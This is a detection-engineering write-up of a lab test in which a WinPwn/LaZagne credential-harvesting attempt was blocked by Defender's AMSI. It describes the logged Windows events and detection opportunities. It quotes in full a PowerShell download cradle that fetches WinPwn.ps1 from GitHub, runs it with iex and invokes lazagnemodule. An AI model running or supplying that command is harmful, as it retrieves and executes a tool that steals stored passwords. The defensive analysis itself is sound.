# T1555-6: Credentials from Password Stores — WinPwn - Loot Local Credentials - lazagne

## Technique Context

T1555 covers credential theft from password stores. This test uses the WinPwn PowerShell framework (S3cur3Th1sSh1t/WinPwn) to run its `lazagnemodule` function, which wraps the LaZagne credential harvesting tool. LaZagne is a well-known open-source credential recovery utility that extracts passwords from dozens of applications — browsers, email clients, databases, Wi-Fi profiles, and the Windows Credential Manager. WinPwn serves as a delivery wrapper, pulling the framework from GitHub at runtime and invoking specific modules. The `lazagnemodule` function in WinPwn downloads and executes a compiled LaZagne binary or PowerShell implementation and aggregates results.

## What This Dataset Contains

The dataset spans approximately 8 seconds (2026-03-14T00:38:21Z – 00:38:29Z) on ACME-WS02.

**The attack command is visible in Security EID 4688 and PowerShell EID 4104:**

> `"powershell.exe" & {iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')`
> `lazagnemodule -consoleoutput -noninteractive}`

The URL is a pinned commit of WinPwn.ps1. PowerShell EID 4103 records `New-Object` with TypeName `net.webclient`, and Sysmon EID 22 records the DNS query for `raw.githubusercontent.com` resolving to the GitHub CDN (185.199.108-111.133). The download succeeded — the DNS query and the subsequent Defender block confirm the payload was retrieved.

**Windows Defender blocked the script.** PowerShell EID 4100 records:

> `This script contains malicious content and has been blocked by your antivirus software.`
> `Fully Qualified Error ID = ScriptContainedMaliciousContent,Microsoft.PowerShell.Commands.InvokeExpressionCommand`

The WinPwn.ps1 content was downloaded via `DownloadString`, then AMSI scanned it at the `iex()` evaluation point and terminated execution. The `lazagnemodule` function never ran.

Sysmon EID 1 captures `whoami.exe` (tagged T1033) and the PowerShell child process (tagged T1059.001). The PowerShell process is also recorded with `CommandLine` including the full `iex(new-object net.webclient).downloadstring(...)` call.

## What This Dataset Does Not Contain (and Why)

**LaZagne execution or credential output.** AMSI blocked WinPwn.ps1 before any module function was invoked. No LaZagne binary drop, no child process for a LaZagne executable, and no credential dump artifacts are present.

**Network connection event (Sysmon EID 3) for the GitHub download.** The WinPwn download used `net.webclient.DownloadString` rather than `Invoke-WebRequest`; Sysmon captured the DNS query (EID 22) but the network connection was not captured in this dataset's sysmon.jsonl. A network connection event would be expected in an unfiltered environment.

**WinPwn function body in script blocks.** AMSI blocks the script at the `iex()` evaluation boundary; because the block fires before the script is fully compiled into named functions, the WinPwn function bodies do not appear as individual script block logging entries. Only the outer `iex(...)` wrapper and the `net.webclient` object creation are logged.

## Assessment

This dataset captures the **download phase and AMSI block** of a WinPwn/LaZagne credential harvesting attempt. The payload was retrieved from GitHub but prevented from executing by Defender's AMSI integration. The telemetry provides excellent coverage of the pre-execution phase: the `net.webclient.DownloadString` pattern (a classic LOLBin-adjacent download method), the specific WinPwn URL with pinned commit hash, the DNS query, and the AMSI block fingerprint are all faithfully recorded. The `lazagnemodule -noninteractive -consoleoutput` arguments in the command line identify the specific intended action even without execution.

## Detection Opportunities Present in This Data

- **Security EID 4688**: Full command line including `iex(new-object net.webclient).downloadstring(...)` and `lazagnemodule -consoleoutput -noninteractive`. The WinPwn GitHub URL and the `lazagnemodule` function name are directly detectable.
- **PowerShell EID 4104**: Scriptblock captures both the outer invocation and the `{iex(...) lazagnemodule ...}` body. The `lazagnemodule` string is a high-confidence indicator.
- **PowerShell EID 4103**: `New-Object` with `TypeName=net.webclient` — the classic PowerShell download cradle pattern. Combined with the downloaded URL, this is a strong indicator.
- **PowerShell EID 4100**: `ScriptContainedMaliciousContent,InvokeExpressionCommand` — AMSI block on `iex`. The combination of `net.webclient.DownloadString` followed by an AMSI block on the result is a specific and reliable pattern.
- **Sysmon EID 22**: DNS query for `raw.githubusercontent.com` from a SYSTEM-context PowerShell process — particularly suspicious when the process command line contains `downloadstring` or `iex`.
